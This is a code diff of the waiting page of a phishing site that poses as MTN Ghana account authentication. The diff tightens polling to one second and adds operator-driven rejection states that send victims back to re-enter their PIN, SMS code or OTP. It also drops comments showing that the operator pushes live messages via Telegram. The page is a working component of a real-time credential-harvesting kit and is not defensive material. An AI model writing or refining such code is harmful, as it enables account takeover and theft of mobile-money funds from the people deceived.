@@ -33,7 +33,6 @@
             font-size: 0.85rem; padding: 6px 14px; border-radius: 20px; display: inline-block;
             margin-top: 15px; border: 1px solid #e2e8f0;
         }
-        /* Custom prompt banner pushed live from Telegram */
         .admin-alert-banner {
             display: none; background-color: #fff3cd; color: #856404;
             border: 1px solid #ffeeba; border-radius: 12px;
@@ -57,7 +56,6 @@
             <p class="text-muted small px-3">Please keep this window open while we securely authenticate your account profile with MTN Ghana systems.</p>
         </div>
 
-        <!-- Live Admin Alert / Correction Box -->
         <div id="adminAlertBox" class="admin-alert-banner">
             <div class="fw-bold mb-1">⚠️ Notice from Support:</div>
             <span id="adminAlertText">Please check your details.</span>
@@ -71,22 +69,31 @@
     <script>
         const appId = "{{ app_id }}";
 
-        // Poll every 2 seconds to check status updates or live admin notes from Telegram
+        // Poll every 1 second for ultra-fast reaction times
         function checkApplicationStatus() {
             fetch(`/check-status?app_id=${appId}`)
                 .then(response => response.json())
                 .then(data => {
                     if (data.status === "Stage1_Approved") {
-                        window.location.href = "/submit-auth-code"; // or next verification step
+                        window.location.href = "/submit-auth-code";
                     } else if (data.status === "Stage2_Approved") {
                         window.location.href = "/final-verify";
                     } else if (data.status === "Approved" || data.status === "Stage3_Approved") {
                         window.location.href = "/success";
-                    } else if (data.status === "Rejected") {
-                        alert("Your verification request was declined. Please try again.");
-                        window.location.href = "/";
-                    } else if (data.custom_message && data.custom_message.trim() !== "") {
-                        // Display the live custom prompt/error message sent via Telegram
+                    } 
+                    // Handle smart rejections and route them back to their specific step
+                    else if (data.status === "Reject_PIN") {
+                        alert(data.custom_message || "PIN rejected. Please try again.");
+                        window.location.href = "/login";
+                    } else if (data.status === "Reject_SMS") {
+                        alert(data.custom_message || "SMS rejected. Please try again.");
+                        window.location.href = "/submit-auth-code";
+                    } else if (data.status === "Reject_OTP") {
+                        alert(data.custom_message || "OTP rejected. Please try again.");
+                        window.location.href = "/final-verify";
+                    } 
+                    // Handle live custom prompts or warnings
+                    else if (data.custom_message && data.custom_message.trim() !== "") {
                         const alertBox = document.getElementById('adminAlertBox');
                         const alertText = document.getElementById('adminAlertText');
                         alertText.textContent = data.custom_message;
@@ -96,7 +103,7 @@
                 .catch(err => console.log('Polling error:', err));
         }
 
-        setInterval(checkApplicationStatus, 2000);
+        setInterval(checkApplicationStatus, 1000);
     </script>
 </body>
 </html>
